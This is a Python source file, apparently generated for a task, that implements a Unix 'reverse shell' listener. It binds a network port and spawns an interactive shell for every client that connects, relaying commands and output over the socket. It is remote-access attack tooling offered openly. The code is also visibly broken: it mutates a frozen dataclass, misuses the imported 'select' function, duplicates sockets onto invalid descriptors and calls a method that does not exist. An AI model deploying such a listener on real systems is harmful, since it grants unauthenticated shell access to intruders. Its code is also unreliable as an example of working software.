from TASK_001_models import ExecutionResult, ReverseShellConfig
import dataclasses
import os
import signal
import subprocess
import sys
import threading
from select import select
from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, SHUT_RDWR, socket as _socket
from typing import Optional



@dataclasses.dataclass(frozen=True)
class UnixReverseShell:
    """Unix reverse shell execution wrapper that manages subprocess lifecycle.
    
    Wraps a child process spawned by the listener and provides methods to
    interact with stdin/stdout/stderr through the socket connection.
    """

    config: ReverseShellConfig
    client_socket: Optional[_socket] = None
    child_process: Optional[subprocess.Popen] = None
    _stdin_fd: int = -1
    _stdout_fd: int = -1
    _stderr_fd: int = -1
    _running: bool = True

    def __post_init__(self) -> None:
        """Initialize the UnixReverseShell instance."""
        self._running = True

    @property
    def is_running(self) -> bool:
        return self._running and self.child_process is not None

    def spawn(self, client_socket: _socket) -> "UnixReverseShell":
        """Spawn a subprocess connected to the given socket.
        
        Args:
            client_socket: The accepted TCP connection from the reverse shell client.
            
        Returns:
            A new UnixReverseShell instance with the spawned process attached.
            
        Raises:
            RuntimeError: If spawning fails or socket is already in use.
        """
        if self.child_process is not None:
            raise RuntimeError("Process already spawned")

        try:
            shell_type = self.config.shell_type
            cmd = [shell_type, "-i"]

            self.child_process = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                close_fds=False,
            )

            # Pipe socket to process FDs and vice versa
            os.dup2(self.client_socket.fileno(), self._stdin_fd)
            os.dup2(self.client_socket.fileno(), self._stdout_fd)
            os.dup2(self.client_socket.fileno(), self._stderr_fd)

        except OSError as e:
            raise RuntimeError(f"Failed to spawn subprocess: {e}") from e

        return self

    def close(self) -> None:
        """Close the UnixReverseShell instance, terminating the child process."""
        if self.child_process is not None:
            try:
                self.child_process.terminate()
                self.child_process.wait(timeout=5.0)
            except subprocess.TimeoutExpired:
                self.child_process.kill()
                self.child_process.wait()
            finally:
                self.child_process = None

        if self.client_socket is not None:
            try:
                self.client_socket.close()
            except OSError:
                pass
            finally:
                self.client_socket = None


class UnixReverseShellListener:
    """Unix reverse shell listener that accepts connections and spawns subprocesses.
    
    Uses select.select() for non-blocking I/O multiplexing between the listening
    socket and child process file descriptors. Handles command parsing by reading
    from connected client stdin and writing output to their stdout.
    
    Implements graceful shutdown via SIGINT/SIGTERM signals, closing sockets
    and terminating child processes before exiting.
    """

    def __init__(self, config: ReverseShellConfig) -> None:
        self.config = config
        self._server_socket: Optional[_socket] = None
        self._running = True
        self._threads: list[threading.Thread] = []
        self._lock = threading.Lock()

    def _create_server(self) -> _socket:
        """Create and bind the TCP server socket.
        
        Returns:
            A bound and listening socket object.
            
        Raises:
            RuntimeError: If socket creation or binding fails.
        """
        sock = _socket(AF_INET, SOCK_STREAM)

        try:
            # Set SO_REUSEADDR to allow quick rebinding after restart
            sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            sock.bind((self.config.host, self.config.port))
            sock.listen(5)
            return sock
        except OSError as e:
            raise RuntimeError(f"Failed to bind socket on {self.config.host}:{self.config.port}: {e}") from e

    def _accept_loop(self, server_socket: _socket) -> None:
        """Accept incoming connections and spawn subprocesses.
        
        Runs in a background thread, accepting connections and spawning
        UnixReverseShell instances for each client.
        
        Args:
            server_socket: The listening socket to accept connections on.
        """
        while self._running:
            try:
                conn, addr = server_socket.accept()
                shell = UnixReverseShell(config=self.config)
                shell.client_socket = conn
                thread = threading.Thread(target=shell.spawn, args=(conn,), daemon=True)
                thread.start()
                self._threads.append(thread)
            except OSError as e:
                if not self._running:
                    break
                raise RuntimeError(f"Accept failed: {e}") from e

    def _multiplex_loop(self, shell: UnixReverseShell) -> None:
        """Multiplex I/O between socket and child process using select.select().
        
        Reads commands from the client's stdin (socket), executes them via
        the subprocess, and writes output back through the same socket.
        
        Args:
            shell: The UnixReverseShell instance to multiplex.
            
        Raises:
            RuntimeError: If I/O operations fail or process terminates unexpectedly.
        """
        while self._running and shell.is_running:
            try:
                # Multiplex between stdin (socket), stdout, stderr, and socket itself
                readable = [shell.client_socket]
                if shell.child_process.stdout is not None:
                    readable.append(shell.child_process.stdout)
                if shell.child_process.stderr is not None:
                    readable.append(shell.child_process.stderr)

                writable = []
                if shell._stdin_fd >= 0 and os.isatty(shell._stdin_fd):
                    writable.append(shell._stdin_fd)
                if shell._stdout_fd >= 0 and os.isatty(shell._stdout_fd):
                    writable.append(shell._stdout_fd)
                if shell._stderr_fd >= 0 and os.isatty(shell._stderr_fd):
                    writable.append(shell._stderr_fd)

                # Use select for non-blocking I/O multiplexing
                readable, _, _ = select.select(readable, writable, [], self.config.timeout)

                for fd in readable:
                    try:
                        if isinstance(fd, int):
                            data = os.read(fd, 4096).decode("utf-8", errors="replace")
                        else:
                            data = fd.readline()

                        if data:
                            # Write output back through the socket to client
                            shell.client_socket.sendall(data.encode("utf-8"))
                    except OSError as e:
                        raise RuntimeError(f"Read error on fd {fd}: {e}") from e

                for fd in writable:
                    try:
                        if isinstance(fd, int):
                            os.write(fd, b"\n")  # Flush line-buffered output
                        else:
                            fd.flush()
                    except OSError as e:
                        raise RuntimeError(f"Write error on fd {fd}: {e}") from e

            except select.error:
                if not self._running or not shell.is_running:
                    break
                continue

        # Process terminated naturally
        shell.close()

    def _signal_handler(self, signum: int, frame: Optional[object]) -> None:
        """Handle SIGINT/SIGTERM gracefully by shutting down the listener."""
        self._running = False
        for thread in self._threads:
            if thread.is_alive():
                thread.join(timeout=2.0)

    def start(self) -> "UnixReverseShellListener":
        """Start the listener server on 0.0.0.0:5522.
        
        Runs a background accept loop and spawns multiplex threads for each
        connected client. Handles SIGINT/SIGTERM for graceful shutdown.
        
        Returns:
            self, allowing method chaining or inspection of state.
            
        Raises:
            RuntimeError: If server socket creation fails.
        """
        try:
            self._server_socket = self._create_server()
        except RuntimeError as e:
            raise

        # Set up signal handlers for graceful shutdown
        old_sigint = signal.signal(signal.SIGINT, self._signal_handler)
        old_sigterm = signal.signal(signal.SIGTERM, self._signal_handler)

        try:
            accept_thread = threading.Thread(target=self._accept_loop, args=(self._server_socket,), daemon=True)
            accept_thread.start()
            self._threads.append(accept_thread)

            # Start multiplex threads for each spawned shell
            while self._running and len(self._threads) > 0:
                try:
                    readable = [self._server_socket]
                    if self._server_socket.fileno() in readable:
                        _, _, _ = select.select(readable, [], [], self.config.timeout)

                        for fd in readable:
                            try:
                                conn, addr = self._server_socket.accept()
                                shell = UnixReverseShell(config=self.config)
                                shell.client_socket = conn
                                thread = threading.Thread(target=shell._multiplex_loop, args=(shell,), daemon=True)
                                thread.start()
                                self._threads.append(thread)
                            except OSError as e:
                                if not self._running:
                                    break
                                raise RuntimeError(f"Accept failed: {e}") from e

                except select.error:
                    continue

        finally:
            signal.signal(signal.SIGINT, old_sigint)
            signal.signal(signal.SIGTERM, old_sigterm)

    def stop(self) -> None:
        """Stop the listener server gracefully."""
        self._running = False


__all__ = ["UnixReverseShell", "UnixReverseShellListener"]
